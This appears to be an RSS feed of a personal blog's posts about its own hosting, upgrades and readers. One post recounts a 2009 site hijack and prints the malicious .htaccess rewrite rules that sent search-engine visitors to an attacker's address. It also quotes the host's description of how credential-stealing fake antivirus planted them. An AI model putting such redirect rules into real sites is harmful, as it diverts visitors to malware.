@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>This Blog &#8211; Syntactically Correct</title>
+	<atom:link href="/old-blog/category/this-blog/feed" rel="self" type="application/rss+xml" />
+	<link>/old-blog/</link>
+	<description>Amit Schreiber&#039;s Blog &#124; הבלוג של עמית שרייבר</description>
+	<lastBuildDate>Mon, 18 Mar 2019 14:00:46 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.7.2</generator>
+	<item>
+		<title>This Site Is Now Encrypted Thanks To Let&#8217;s Encrypt</title>
+		<link>/old-blog/3298</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Thu, 28 Jan 2016 14:14:22 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=3298</guid>
+
+					<description><![CDATA[Let&#8217;s Encrypt is a project aiming to provide free SSL certificates to websites. And now this blog uses it, thanks to the simple integration from my web hosting provider, DreamHost. If you have your own domain and you want to encrypt it, Let&#8217;s Encrypt is a great option.]]></description>
+										<content:encoded><![CDATA[<p><a href="https://letsencrypt.org/">Let&#8217;s Encrypt</a> is a project aiming to provide free SSL certificates to websites. And now this blog uses it, thanks to the simple integration from my web hosting provider, <a href="https://www.dreamhost.com/">DreamHost</a>.</p>
+<p>If you have your own domain and you want to encrypt it, Let&#8217;s Encrypt is a great option.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Comment Spam</title>
+		<link>/old-blog/3133</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Tue, 04 Nov 2014 07:59:25 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=3133</guid>
+
+					<description><![CDATA[Comment spam seems to be on the rise. So much so that my hosting service completely removed this site to avoid hurting other shared hosting instances. I was forced to disable comments on posts older than 30 days and on the 2 pages in this blog. It&#8217;s a shame, but I wanted the blog to &#8230; <p class="link-more"><a href="/old-blog/3133" class="more-link">Continue reading<span class="screen-reader-text"> "Comment Spam"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Comment spam seems to be on the rise. So much so that my hosting service completely removed this site to avoid hurting other shared hosting instances.</p>
+<p>I was forced to disable comments on posts older than 30 days and on the 2 pages in this blog. It&#8217;s a shame, but I wanted the blog to be back up.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Trying Anonymous Comments</title>
+		<link>/old-blog/1524</link>
+					<comments>/old-blog/1524#comments</comments>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sun, 07 Jun 2009 05:51:36 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=1524</guid>
+
+					<description><![CDATA[To avoid comment spam I&#8217;ve previously disallowed anonymous comments on this blog. I would like to see if allowing anonymous comments can work without this blog filling up with huge amounts of spam. I still prefer that users register and comment, but now you can just blurt out whatever it is on your mind without &#8230; <p class="link-more"><a href="/old-blog/1524" class="more-link">Continue reading<span class="screen-reader-text"> "Trying Anonymous Comments"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>To avoid comment spam I&#8217;ve previously disallowed anonymous comments on this blog. I would like to see if allowing anonymous comments can work without this blog filling up with huge amounts of spam.</p>
+<p>I still prefer that users register and comment, but now you can just blurt out whatever it is on your mind without revealing who you are.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/old-blog/1524/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>First DreamHost Let Down</title>
+		<link>/old-blog/1490</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sun, 24 May 2009 05:51:20 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=1490</guid>
+
+					<description><![CDATA[Yesterday the blog went offline for about 12 hours. It started with an &#8220;Internal Server Error&#8221; around 11am Israel time. I was about to comment on one of my posts when it happened, immediately opened a ticket with DreamHost&#8217;s ticket system and was happy to see it being treated promptly &#8211; it moved from &#8220;unverified&#8221; &#8230; <p class="link-more"><a href="/old-blog/1490" class="more-link">Continue reading<span class="screen-reader-text"> "First DreamHost Let Down"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Yesterday the blog went offline for about 12 hours. It started with an &#8220;Internal Server Error&#8221; around 11am Israel time. I was about to comment on one of my posts when it happened, immediately opened a ticket with DreamHost&#8217;s ticket system and was happy to see it being treated promptly &#8211; it moved from &#8220;unverified&#8221; to &#8220;verified&#8221; to &#8220;resolved.&#8221;</p>
+<p>But the issue was not resolved &#8211; the website was still down so I opened another ticket, this time telling them that it&#8217;s not OK to set the status of a ticket to &#8220;resolved&#8221; if the website is still down. What I got in return were offers on how to improve the speed of my blog. Considering that it serves 7 readers, I told them this could hardly be the reason. And I haven&#8217;t changed the code in a while, so it&#8217;s not supposed to break just like that. I still tried what they offered (disabling WordPress plugins) which of course didn&#8217;t help.</p>
+<p>So I replied to their email and after 12 hours someone at DreamHost&#8217;s support (thanks, Jason) decided to actually look into the issue, agreed with me that the problem was on their end and fixed it.</p>
+<p>I hope it&#8217;s a one time thing and not an indication of things to come. It&#8217;s a real hassle to switch hosts and I wouldn&#8217;t want to do it again.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>This Blog Is Now Hosted On DreamHost</title>
+		<link>/old-blog/1414</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sat, 09 May 2009 06:15:32 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=1414</guid>
+
+					<description><![CDATA[Over the weekend I moved this blog to DreamHost. They have a deal where you pay less than 10 USD for the first year of hosting and they seem pretty decent. My previous host, IX Web Hosting, really sucked and the blog was hijacked thanks to their stupidity, even during my trip. I hope that &#8230; <p class="link-more"><a href="/old-blog/1414" class="more-link">Continue reading<span class="screen-reader-text"> "This Blog Is Now Hosted On DreamHost"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Over the weekend I moved this blog to <a href="http://dreamhost.com/">DreamHost</a>. They have a deal where you pay less than 10 USD for the first year of hosting and they seem pretty decent. My previous host, IX Web Hosting, <a href="/old-blog/738">really sucked</a> and the blog was hijacked thanks to their stupidity, even during my trip. I hope that I won&#8217;t have to worry about stuff like that anymore.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Previous Post Was Updated</title>
+		<link>/old-blog/802</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Thu, 29 Jan 2009 12:48:41 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=802</guid>
+
+					<description><![CDATA[Just a quick note&#8230; also, if you know how to make an updated post re-appear on the RSS feed, please let me know.]]></description>
+										<content:encoded><![CDATA[<p>Just a quick note&#8230; also, if you know how to make an updated post re-appear on the RSS feed, please let me know.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>This Blog Was Hijacked. Shame On IX Web Hosting</title>
+		<link>/old-blog/738</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sat, 10 Jan 2009 09:39:53 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=738</guid>
+
+					<description><![CDATA[Yesterday my brother called me up to let me know that when clicking a link in Google Reader to get to this blog, a malicious website appears instead of the blog. I tried it myself and he was right. The strange thing was that if you tried to enter the address yourself it worked but &#8230; <p class="link-more"><a href="/old-blog/738" class="more-link">Continue reading<span class="screen-reader-text"> "This Blog Was Hijacked. Shame On IX Web Hosting"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Yesterday my brother called me up to let me know that when clicking a link in Google Reader to get to this blog, a malicious website appears instead of the blog. I tried it myself and he was right. The strange thing was that if you tried to enter the address yourself it worked but only if you clicked a link inside Google Reader you would get to the malicious website.</p>
+<p>I tried looking for what could have gone wrong. As I couldn&#8217;t find anything, I assumed maybe some kind of DNS poisoning occurred, that the solution is out of my reach and that if I wait it out a little bit everything will be back to normal.</p>
+<p>So today I checked again and the problem still persisted. I decided to look further into things. Remembering an email message I got from my host, IX Web Hosting, I looked it up. Here it is:</p>
+<blockquote><p>Dear Amit,</p>
+<p>In our ongoing commitment to the security of our customers, we have discovered a vulnerability located within many of our client&#8217;s websites, including yours. This is a self replicating virus which is found by visiting well-known search engines. When you click on any link it may redirect you to a fake Anti-Virus 2009 website which appears to scan your system and then asks you to download the software. Once downloaded and installed it begins displaying pop ups on your desktop. At this time it collects your FTP user name and password from your own computer and uses that information to upload an exploited file named &#8220;.htaccess&#8221; to your website. Any visitors to your website will then be redirected to the fake anti-virus website.</p>
+<p>We have dedicated our systems administration team to finding a solution to this and are happy to say that as one of the first hosting companies we have successfully cleaned all instances of this virus from our servers more than a week ago, and are continually scanning them to ensure your site does not become re-infected.</p>
+<p>While your website is now secure, your computer may still be at risk. Here are two easy steps that will detect and remove this malicious software from your computer and make sure your website will not spread the virus again:</p>
+<p>1. Uninstall the fake Anti-Virus software by following the instructions at this link:<br />
+http://www.bleepingcomputer.com/malware-removal/uninstall-antivirus-2009</p>
+<p>2. Once removed, change your FTP password from within your web hosting control panel. Once logged in, click on the FTP Manager icon and then on the icon next to the password to change it.</p>
+<p>To illustrate the severity of the issue I would like to share some facts with you:</p>
+<p>* 26,991 of our customers have been infected with fake Anti-Virus 2009<br />
+* 79,469 websites have been spreading the Anti-Virus 2009 infection<br />
+* 120,923 malicious files have been removed from our system</p>
+<p>We are constantly monitoring our servers for potential threats to your website, and are proud to say that we are among the first web hosts to identify this particular problem, and have been the first to offer a resolution. Your continued and safe presence on the internet is our top priority.</p>
+<p>If you have questions regarding any of this information, please contact our support team anytime.</p>
+<p>Kind Regards,</p>
+<p>Fatima Said, CCO<br />
+IX Web Hosting<br />
+http://www.ixwebhosting.com/</p></blockquote>
+<p>When I first got this message I thought it was a hoax. Considering that the computers I use to access my website all have Linux installed, &#8220;blaming&#8221; me for having the infamous Anti-Virus 2009 (which is a relatively new and very aggressive virus) on my computers is simply wrong, being impossible and all. So I ignored the message but still kept it (I thought about contacting IX Web Hosting to ask whether this was real but just forgot about it.)</p>
+<p>Reading the message from IX Web Hosting again, though, got me to check my .htaccess file. And indeed the file contained the following lines:<br />
+<code><br />
+RewriteEngine On<br />
+RewriteCond %{HTTP_REFERER} .*oogle.*$ [NC,OR]<br />
+RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]<br />
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]<br />
+RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]<br />
+RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]<br />
+RewriteCond %{HTTP_REFERER} .*ahoo.*$ [NC]<br />
+RewriteRule .* http://10.0.0.1/join.html?s=join [R,L]<br />
+</code><br />
+These lines mean that if you get to this website from any of the well-known search engines you will be redirected to the address at the last line (I changed the IP address intentionally.) Once I deleted the file from the website&#8217;s root directory everything was back to normal. Now I wanted to know how long my blog had been hijacked. My Google Analytics account revealed the answer: my search engines sources dropped to almost zero around December 14th (about a month ago.)</p>
+<p>Digging further, I found <a href="http://ixwebhostwarning.wordpress.com/2008/12/11/26991-ix-web-hosting-customers-infected/">this post</a> on the <a href="http://ixwebhostwarning.wordpress.com/">IX Web Hosting Warning</a> blog. The writer of the post seems to think, like me, that IX Web Hosting are simply trying to shift the blame to the customers, which is a big shame.</p>
+<p>Up until today I was generally happy with IX Web Hosting. I almost never had any problems with the website and whenever I needed support they answered quickly and resolved any issues I had. But reading through the IX Web Hosting Warning blog made me want to switch hosts (again.) I guess I&#8217;ll do that when I&#8217;m back from <a href="/old-blog/733">my trip</a> and hope for the best until then. I just can&#8217;t be bothered right now with switching hosts.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>This Is An Upgraded Blog</title>
+		<link>/old-blog/676</link>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sat, 22 Nov 2008 17:28:21 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=676</guid>
+
+					<description><![CDATA[Finally I took the time and courage to update my blog&#8217;s software. It is now running WordPress 2.6.3, the latest and greatest from the good people at WordPress.org. To upgrade the blog I first had to convert the database to a utf8_unicode_ci collation. It was already Unicode, but the collation wasn&#8217;t set right. That was &#8230; <p class="link-more"><a href="/old-blog/676" class="more-link">Continue reading<span class="screen-reader-text"> "This Is An Upgraded Blog"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Finally I took the time and courage to update my blog&#8217;s software. It is now running WordPress 2.6.3, the latest and greatest from the good people at <a title="Wordpress website" href="http://wordpress.org/">WordPress.org</a>. To upgrade the blog I first had to convert the database to a utf8_unicode_ci collation. It was already Unicode, but the collation wasn&#8217;t set right. That was frightening stuff by itself, since these kind of changes can convert all my Hebrew posts to common Gibberish. Naturally I tested this on my home copy of the blog and had everything backed up beforehand, but still&#8230;</p>
+<p>The upgrade process went very smoothly and lasted for about 15 minutes (I doubt any of the 6 readers of this blog saw the &#8220;I&#8217;m upgrading&#8221; message I put on the front page). I chose the <a title="Wordpress extended upgrade instructions" href="http://codex.wordpress.org/Upgrading_WordPress_Extended">extended upgrade instructions</a> which include the scary step of deleting almost everything from the server. But it&#8217;s the cleaner way to go. I was pleasantly surprised to learn the WordPress now supports &#8220;Unicode connections&#8221; (or whatever the formal name is) to the database so I don&#8217;t need to hack the wp-db.php file like I used to before following upgrades.</p>
+<p>The reason for the upgrade is my upcoming trip. I would like to use the blog to post updates and pictures from the trip. I still need to choose a solution for posting pictures. There are many to choose from.</p>
+<p>Hebrew is still aligned to the left. I&#8217;ll get to that soon. Now&#8230; let&#8217;s see if this post goes through :)</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Next Week I&#8217;m In Eilat</title>
+		<link>/old-blog/639</link>
+					<comments>/old-blog/639#comments</comments>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Thu, 24 Jan 2008 12:21:00 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[Personal]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=639</guid>
+
+					<description><![CDATA[Next week I&#8217;m in Eilat on vacation, so this blog will probably not be updated at least until February 3rd. All six readers of this blog are welcome to check for updates after that time.]]></description>
+										<content:encoded><![CDATA[<p>Next week I&#8217;m in Eilat on vacation, so this blog will probably not be updated at least until February 3rd. All six readers of this blog are welcome to check for updates after that time.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/old-blog/639/feed</wfw:commentRss>
+			<slash:comments>8</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>An Apology To One Of This Blog&#8217;s Readers</title>
+		<link>/old-blog/636</link>
+					<comments>/old-blog/636#comments</comments>
+		
+		<dc:creator><![CDATA[Amit Schreiber]]></dc:creator>
+		<pubDate>Sun, 20 Jan 2008 06:32:42 +0000</pubDate>
+				<category><![CDATA[English]]></category>
+		<category><![CDATA[Personal]]></category>
+		<category><![CDATA[This Blog]]></category>
+		<guid isPermaLink="false">/old-blog/?p=636</guid>
+
+					<description><![CDATA[Two days ago I was at a party. Even before I went I was informed by the party&#8217;s organizer that her friend, who reads my blog, will be there. I always think of the readers of this blog as a collection of people I know, so learning about this &#8220;unknown&#8221; reader was exciting. At the &#8230; <p class="link-more"><a href="/old-blog/636" class="more-link">Continue reading<span class="screen-reader-text"> "An Apology To One Of This Blog&#8217;s Readers"</span></a></p>]]></description>
+										<content:encoded><![CDATA[<p>Two days ago I was at a party. Even before I went I was informed by the party&#8217;s organizer that her friend, who reads my blog, will be there. I always think of the readers of this blog as a collection of people I know, so learning about this &#8220;unknown&#8221; reader was exciting.</p>
+<p>At the party I was introduced to this girl (who also played the guitar during the party. Very cool) and she said &#8220;I&#8217;m a fan of your blog.&#8221; I should have just said &#8220;thanks&#8221; but I was completely out of words. After running the options through my head I said something I thought about that day. I said: &#8220;Now I know all the readers of the blog.&#8221; That thought made me smile when I thought about it during the day, but I think maybe I came out a cocky asshole by saying what I said.</p>
+<p>So this is an apology to this very nice reader. I&#8217;m sorry and thanks a lot. You gave me a great compliment, which made me very happy.</p>
+<p>p.s.</p>
+<p>From now on I will refer to you as &#8220;all 6 readers of this blog&#8221;</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/old-blog/636/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
